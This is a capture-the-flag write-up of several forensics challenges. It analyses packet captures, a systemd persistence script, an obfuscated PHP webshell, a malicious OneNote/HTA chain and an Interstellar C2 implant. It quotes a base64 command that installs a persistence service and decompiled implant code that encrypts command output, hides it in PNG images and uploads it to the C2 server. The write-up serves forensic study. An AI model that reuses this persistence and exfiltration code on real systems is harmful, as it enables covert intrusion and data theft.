# forensics

## Plaintext Tleasure
> Solved by : thewhiteh4t


- Simple challenge, just go through HTTP requests and flag is sent in a POST request


![](https://i.imgur.com/BUAKbYK.png)

    HTB{th3s3_4l13ns_st1ll_us3_HTTP}


----------


## Alien cradle
> Solved by : thewhiteh4t


- A powershell script is given
- the flag is present in a variable `f` in concatenated form


    HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}


----------


## Extraterrestrial persistence
> Solved by : thewhiteh4t


- A bash script is given which installs a systemd service
- one of the lines contains an `echo` command :

```
echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service
```

- Decoding the base64 string gives us the flag

```
HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
```

----------


## Roten
> Solved by : thewhiteh4t


- A PCAP file is given again
- Apply a filter to view only POST requests :

```
http.request.method=="POST"
```

- In one of the requests we can see a PHP file by the name `galacticmap.php` is uploaded


![](https://i.imgur.com/MCqcnwa.png)

- It is a obfuscated PHP file, in its last line of code `eval` function is executed
- To de-obfuscate I commented out the eval and added an `echo`


![](https://i.imgur.com/Y607MYg.png)

- After running this PHP file we can get the flag :


![](https://i.imgur.com/B4RO5aI.png)

----------


## Packet cyclone
> Solved by : thewhiteh4t


- We are given Windows EVTX files and sigma rules for detecting exfiltration using `rclone`
- To scan these EVTX files we can use `chainsaw` which supports sigma rules

```
chainsaw hunt -s sigma_rules -m sigma-event-logs-all.yml Logs
```

- Two detection are shown
- First one contains credentials of `mega.nz`
![](https://i.imgur.com/wh4wNy1.png)

- Second contains file paths


![](https://i.imgur.com/IooHAxJ.png)

- Here are the correct answers based on information given in these two detection :


![](https://i.imgur.com/qajxXjN.png)

----------


## Artifacts of disastrous sightings
> Solved by : thewhiteh4t


- In this challenge we start with a `vhdx` file which is a type of virtual hard disk

```
> file 2023-03-09T132449_PANDORA.vhdx
2023-03-09T132449_PANDORA.vhdx: Microsoft Disk Image eXtended, by .NET DiscUtils, sequence 0x8; LOG; region, 2 entries, id Metadata, at 0x200000, Required 1, id BAT, at 0x300000, Required 1
```

- Before we can mount this disk we need to find partition information using `guestfish` :

```
> guestfish -a 2023-03-09T132449_PANDORA.vhdx

Welcome to guestfish, the guest filesystem shell for
editing virtual machine filesystems and disk images.

Type: ‘help’ for help on commands
      ‘man’ to read the manual
      ‘quit’ to quit the shell

><fs> run
><fs> list-filesystems
/dev/sda1: ntfs
><fs> exit
```

- Now we can mount it using `guestmount` :

```
> guestmount -a 2023-03-09T132449_PANDORA.vhdx -m /dev/sda1 --ro mpoint
```

- Now I started enumerating with the given hints in challenge description :

```
> notices the Windows Event Viewer tab open on the Security log
> takes a snapshot of her machine and shuts it down
> diving deep down and following all traces
```

- After some digging I landed on powershell command history :

```
C/Users/Pandora/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline
```

![](https://i.imgur.com/YrLRwlP.png)

- So attackers executed a command and removed powershell logs
- At this point I went looking into multiple ways of extracting and reading powershell EVTX logs but could not find anything useful
- Then I finally realized that the command is actually creating a `hidden.ps1` in `Alternate Data Stream` , this is an NTFS specific feature and attackers can hide payloads in ADS
- After this I realized the title of the challenge is also a big hint which I totally missed otherwise it would have saved lot of time
- After switching to windows I confirmed my doubts and it was indeed ADS :

```
PS E:\C\Windows\Tasks> Get-Item * -Stream *
```

![](https://i.imgur.com/snazniP.png)

- for reading `hidden.ps1` :

```
PS E:\C\Windows\Tasks> get-item .\ActiveSyncProvider.dll | Get-Content -Stream 'hidden.ps1'
```

![](https://i.imgur.com/2QDH47H.png)

- I got excited and quickly loaded the encoded string in cyberchef and this happened :


![](https://i.imgur.com/6nOu6pe.png)

- A very long string of these special characters, at this point I kept trying to fix the base64 because there are many sections which are duplicate
- Finally I gave up on fixing and started to find more about this type of encoding and after sometime landed on this project :


https://github.com/danielbohannon/Invoke-Obfuscation

- This project uses a technique found by 牟田口大介 (@mutaguchi) :


http://perl-users.jp/articles/advent-calendar/2010/sym/11

- This turned out to be a custom encoding technique and I could not find any de-obfuscator for it, so the easiest way forward was to just run the script and extract the script blocks from EVTX files in windows
- By default module logging and script block logging are disabled, I enabled both in GPO


![](https://i.imgur.com/4to0yFu.png)

- After this I executed `hidden.ps1` and checked event logs and finally I saw some readable code :


![](https://i.imgur.com/1tfba2L.png)

- Now I started looking for more code but not much was visible in viewer so I started looking for something to extract script blocks and found this nice blog :


https://vikas891.medium.com/join-powershell-script-from-event-logs-12deef6dd5ab


https://gist.githubusercontent.com/vikas891/841ac223e69913b49dc2aa9cc8663e34/raw/ce73035acd161c181da2bc9bb4fdab235e0f0de2/ExtractAllScripts.ps1


- The script provided at the end worked perfectly!


![](https://i.imgur.com/ukpDLfC.png)

- In one of the scripts I got the flag :


![](https://i.imgur.com/yRW3OAP.png)

----------

## Relic Maps
> Solved by: Bobbysox

The relic maps challenge started with the link to one file called relicmaps.one. This is a onedrive file and has been the focus of recent breaches because it can bypass the Mark of the Web(MOTW). I used a tool called pyone note.


https://github.com/DissectMalware/pyOneNote



![](https://i.imgur.com/T2vTz3K.png)


Now that we have extracted all the data the next thing to do was hunt down the macros that were likely used for this attack. This attacker embedded an hta file that contained vbscript. This vbscript would effectively reach out for the “payload”

initial access vector exploit chain phish>.hta>vbscript>wmi>download>cmd_exec

![](https://i.imgur.com/pOtL7U1.png)


The only valid url out of those was the windows.bat file. It was a mess, but there were three separate parts to this payload that make it “work”

The table of obfuscated strings:

![](https://i.imgur.com/scOlEQO.png)



The commands that these strings were being mapped to:

![User-uploaded image: image.png](https://paper-attachments.dropboxusercontent.com/s_FFC39C0D0A63EEB84A0808DC546A8687D9158DC27D38645F3E335CF6E40F4111_1679283123508_image.png)


This isnt actually encryption or encoding, its a long and obnoxious obfuscation technique instead.
The values pictured above, were mapped to a section of encrypted text that appeared lower in the windows.bat file:


Unknown data:

![](https://i.imgur.com/qrX7Vjc.png)


You can confirm this by decrypting a few blocks and see if it makes sense like so:

![](https://cdn.discordapp.com/attachments/974745664112189472/1087090966701285427/image.png)



to help assist in the decryption of the text, TwH assisted with a python script that could automate this:

![](https://i.imgur.com/oA1jIrW.png)


Now that the python script did most of the heavy lifting, I just separated the script by the variables and the one function that was present:


![](https://i.imgur.com/ZFcuEO0.png)


From here it was very trivial. This has been seen in the wild and written about by sans instructors here:
https://isc.sans.edu/diary/A+First+Malicious+OneNote+Document/29470
it was quite easy as it was just reverse base64 as noted here:

```
('gnirtS46esaBmorF'[-1..-16] -join '')
```

We have completely reverse engineered the cryptographic functions and have managed to obtain the full keys. There was only one data set we havent used yet. Pretty solid guess that it is our actual payload. The only thing we had to do to get the flag was follow the sans article exactly on how they decrypted the payload.

----------
## Interstellar C2
> Solved by : thewhiteh4t


- Challenge begins with a PCAPNG file with about 8K packets containing c2 traffic
- After some poking around it was clear that this c2 was using HTTP protocol
- Working in the order of packets first packet contains a request for a powershell script 


![](https://i.imgur.com/DjG949Z.png)

![](https://i.imgur.com/pAy9irJ.png)

- It was slightly obfuscated so I used PSDecode, after decoding :


![](https://i.imgur.com/NfeN2tN.png)

- It fetches an encrypted blob from the c2 server using BitsTransfer
- Decrypts using hardcoded key and iv and stores it as an `exe` file
- This request in wireshark :


![](https://i.imgur.com/8t3yrfz.png)

- By modifying the ps1 script I got the exe file :


![](https://i.imgur.com/SX98LyR.png)

![](https://i.imgur.com/XvXfIcJ.png)

- De-compiling the exe was very easy because it was written in c#


![](https://i.imgur.com/IcdsYZl.png)

- This exe file turns out to be an implant used by the c2
- Now the first get request after ps1 script download is made by this implant :


![](https://i.imgur.com/tWPoeDK.png)

- This turns out to be another encrypted blob, this url query is hardcoded in the source code :


![](https://i.imgur.com/EH50lxy.png)

- The key for AES is also hardcoded
- Lets look at the encryption function of the implant :

```c#
private static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
    {
        byte[] array = null;
        array = (byte[])((unByte == null) ? ((object)Encoding.UTF8.GetBytes(un)) : ((object)unByte));
        if (comp)
        {
            array = Compress(array);
        }
        try
        {
            SymmetricAlgorithm val = CreateCam(key, null);
            byte[] second = val.CreateEncryptor().TransformFinalBlock(array, 0, array.Length);
            return Convert.ToBase64String(Combine(val.get_IV(), second));
        }
        catch
        {
            SymmetricAlgorithm val2 = CreateCam(key, null, rij: false);
            byte[] second2 = val2.CreateEncryptor().TransformFinalBlock(array, 0, array.Length);
            return Convert.ToBase64String(Combine(val2.get_IV(), second2));
        }
    }
```

- Standard AES encryption, but the value of IV is not hardcoded, this was very interesting because all of the implant traffic is encrypted
- we can assume that the server has the key, but if we look at the encryption function the iv is generated on the victim machine by the implant, so server does not have the IV
- so how is the server decrypting requests ? I kept looking in the code and pcap for hours but I could not find it
- finally when i looked at everything I had, the URL was the only plain text data being sent to the server! So I tried to use part of the hardcoded URL as the IV :


![](https://i.imgur.com/8PnooaA.png)

- and it works! I got another base64 block, after decrypting that :


![](https://i.imgur.com/Ct3Opf2.png)

- First line contains the random URI value which we can see in the pcap
- After that there is a large array which contains more URLs similar to the hardcoded one
- Similarly it also contains base64 for PNG images and other juicy stuff
- Server sends a new key for AES encryption : 

```
nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=
```

What is going on ?


- The implant makes a GET request to the c2 server to grab URLs, images and keys
- Then when any command is issued from the c2 server the implant uses that key to encrypt the command output and uses PNGs to send results to the server
- We will see this in detail from this point


![](https://i.imgur.com/nnxGncE.png)

- Second GET query and another encrypted blob
- Simple script for decrypting AES :

```python
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
iv = b'Kettie/Emmie/Ann'
with open('../second_get.data', 'rb') as cipherfile:
    ctext = cipherfile.read()
ciphertext = b64decode(ctext)
key = b64decode('nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=')
# key = b64decode('DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=')
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(pad(ciphertext, 128))
stuff = decrypted[16:].split(b'\x00')[0]
plaintext = b64decode(stuff).decode()
print(plaintext)
```

output :


- At the very start we can see the `multicmd loadmodule`  command, these are found in the implant source code


![](https://i.imgur.com/51X7ELz.png)



- this is followed by another blob and ends with :


![](https://i.imgur.com/g6Me7hN.png)

- The blob turned out to be a SharpSploit DLL
- Moving forward we get our first POST query which is uploading first PNG to the c2 server :


![](https://i.imgur.com/q2V9nvk.png)

- Notice `Malformed` , lets go back to the source : 

```c#
public static void Exec(string cmd, string taskId, string key = null, byte[] encByte = null)
    {
        if (string.IsNullOrEmpty(key))
        {
            key = pKey;
        }
        string cookie = Encryption(key, taskId);
        string text = "";
        text = ((encByte == null) ? Encryption(key, cmd, comp: true) : Encryption(key, null, comp: true, encByte));
        byte[] cmdoutput = Convert.FromBase64String(text);
        byte[] imgData = ImgGen.GetImgData(cmdoutput);
        int num = 0;
        while (num < 5)
        {
            num++;
            try
            {
                GetWebRequest(cookie).UploadData(UrlGen.GenerateUrl(), imgData);
                num = 5;
            }
            catch
            {
            }
        }
    }
```

- Exec function is responsible for handling command output and PNG uploading
- First it creates an encrypted cookie which contains task ID
- Then it encrypts the command output
- Decodes the base64 cipher string and calls `ImgGen` function
- Then it runs a loop to upload the PNG, if any error occurs then the loop increments and upload is re attempted until file is uploaded perfectly
- Now lets look into `ImgGen` :

```c#
internal static class ImgGen
    {
        private static Random _rnd = new Random();
        private static Regex _re = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+", (RegexOptions)8);
        private static List<string> _newImgs = new List<string>();
        internal static void Init(string stringIMGS)
        {
            IEnumerable<string> enumerable = Enumerable.Select<Match, string>(Enumerable.Cast<Match>((IEnumerable)_re.Matches(stringIMGS.Replace(",", ""))), (Func<Match, string>)((Match m) => ((Capture)m).get_Value()));
            enumerable = Enumerable.Where<string>(enumerable, (Func<string, bool>)((string m) => !string.IsNullOrEmpty(m)));
            _newImgs = Enumerable.ToList<string>(enumerable);
        }
        private static string RandomString(int length)
        {
            return new string(Enumerable.ToArray<char>(Enumerable.Select<string, char>(Enumerable.Repeat<string>("...................@..........................Tyscf", length), (Func<string, char>)((string s) => s[_rnd.Next(s.Length)]))));r
        }
        internal static byte[] GetImgData(byte[] cmdoutput)
        {
            int num = 1500;
            int num2 = cmdoutput.Length + num;
            string s = _newImgs[new Random().Next(0, _newImgs.Count)];
            byte[] array = Convert.FromBase64String(s);
            byte[] bytes = Encoding.UTF8.GetBytes(RandomString(num - array.Length));
            byte[] array2 = new byte[num2];
            Array.Copy(array, 0, array2, 0, array.Length);
            Array.Copy(bytes, 0, array2, array.Length, bytes.Length);
            Array.Copy(cmdoutput, 0, array2, array.Length + bytes.Length, cmdoutput.Length);
            return array2;
        }
    }
```

- This function gets a random PNG out of the array it fetched from the c2 server
- Then it proceeds to build the PNG file
- First the PNG data
- Second, it generates a random string based on `...................@..........................Tyscf` charset
- Third, it adds the encrypted command output
- Finally it concatenates all three parts and returns a malicious PNG
- Based on this information we can isolate the command output section in the PNGs
- Implant makes 6 POST requests i.e. 6 attempts at uploading a perfect PNG :


![](https://i.imgur.com/hJfPvQT.png)


First PNG :


![](https://i.imgur.com/0S1ga9W.png)

- The three parts are clearly visible, actual PNG finishes at `IEND` followed by random string and a small encrypted command output
- But the implant made 6 requests, I tried to decrypt the data of each PNG but it did not work

One tiny detail


- Going back to `Encryption` function, it contains a block :

```
if (comp)
        {
            array = Compress(array);
        }
```

- and in `Exec` where `Encryption` is called we have :

```
text = ((encByte == null) ? Encryption(key, cmd, comp: true) : Encryption(key, null, comp: true, encByte));
```

- `comp` is set to `True` which means the encrypted command output is first compressed and then added to the PNG!
- Compression function : 

```c#
private static byte[] Compress(byte[] raw)
    {
        //IL_0009: Unknown result type (might be due to invalid IL or missing references)
        //IL_000f: Expected O, but got Unknown
        using MemoryStream memoryStream = new MemoryStream();
        GZipStream val = new GZipStream((Stream)memoryStream, (CompressionMode)1, true);
        try
        {
            ((Stream)(object)val).Write(raw, 0, raw.Length);
        }
        finally
        {
            ((IDisposable)val)?.Dispose();
        }
        return memoryStream.ToArray();
    }
```

- GZip compression is used to compress the encrypted command output
- Going back to wireshark, the sixth, last PNG is largest in size and I assumed that first 5 requests failed to upload a perfect PNG and the next sixth request succeeded
- Isolating command output :


![](https://i.imgur.com/vTEVfWp.png)

- Start is set to 1500 following the `ImgGen` code which uses a fixed size of 1500, PNG data and random string is isolated and we are left with compressed encrypted command output
- I made modifications in my decryption script to de-compress the encrypted data before attempting decryption :

```python
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import zlib
iv = b'Kettie/Emmie/Ann'
with open('../sixth_png.data', 'rb') as cipherfile:
    ctext = cipherfile.read()
ciphertext = ctext
key = b64decode('nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=')
# key = b64decode('DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=')
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(pad(ciphertext, 128))
enc_text = zlib.decompress(decrypted[16:], 15+32)
dec_enc_text = b64decode(enc_text)
with open('flag', 'wb') as out:
    out.write(dec_enc_text)
```


![](https://i.imgur.com/ygvOj8V.png)


And I got the flag! look at top right


![](https://i.imgur.com/10zcW6i.png)

